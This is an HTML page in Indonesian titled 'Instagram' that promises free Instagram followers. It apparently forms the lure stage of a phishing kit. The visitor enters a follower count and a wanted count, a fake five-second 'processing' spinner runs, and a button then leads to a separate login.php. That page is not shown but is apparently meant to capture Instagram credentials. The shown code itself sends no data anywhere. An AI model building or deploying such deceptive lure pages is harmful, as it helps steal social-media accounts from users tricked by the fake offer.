<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style/bootstrap/css/bootstrap.css">
    <link rel="stylesheet" href="style/style.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <title>Instagram</title>
</head>
<body>
    <div class="space"></div>
    <div class="wraper justify-content-center">
        <div class="container">
            <marquee direction="">Followers Gratis Instagram 2021</marquee>
            <form action="#">
                <label for="follanda">Followers anda saat ini</label>
                <input type="number" class="form-control" id="follanda" required>
                <br>
                <label for="jmlfoll">Jumlah Followers yang anda inginkan</label>
                <input type="range" min="1" max="10000" value="0" class="form-control" id="jmlfoll" required>
                <div class="slider"></div>
                <div class="text-center justify-content-center">
                    <img src="https://c.tenor.com/I6kN-6X7nhAAAAAj/loading-buffering.gif" class="loading" style="width: 10%; visibility: hidden; position: absolute;">
                </div>
                <br>
                <button id="submit" class="btn btn-success btn-block">Dapatkan Followers</button>
                <a href="login.php" id="next" style="visibility: hidden;" class="btn btn-danger btn-block">Lanjutkan Proses</a>
            </form>
        </div>
    
    </div>
    
    <script src="style/bootstrap/js/bootstrap.js"></script>
    <script>
        const slider = document.getElementsByClassName("slider");
        const jmlfoll = [];
        const follanda = [];
        let loading = document.querySelector(".loading");
        let submit = document.querySelector("#submit");
        let next = document.querySelector("#next");
            document.getElementById("jmlfoll").addEventListener("input", function nilaiSlider() {
                document.querySelector(".slider").innerHTML = document.querySelector("#jmlfoll").value + " " + "Followers";
            });

        submit.addEventListener("click", function simpan() {
            if ((document.querySelector("#follanda").value && document.querySelector("#jmlfoll").value) != 0) {
                jmlfoll[0] = document.querySelector("#jmlfoll").value;
                follanda[0] = document.querySelector("#follanda").value;
                const obj = {jmlfolls: jmlfoll, follandas: follanda}
                localStorage.setItem("fakeFoll", JSON.stringify(obj));
                loading.style.visibility = "visible";
                loading.style.position = "relative";
                setTimeout(function() {
                    loading.style.visibility = "hidden";
                    next.style.visibility = "visible";
                    loading.style.position = "absolute";
                    submit.style.visibility = "hidden";
                }, 5000);

                event.preventDefault();
                

            }else{
                alert("Isi bidang yang kosong!");
            }

        })
    </script>
</body>
</html>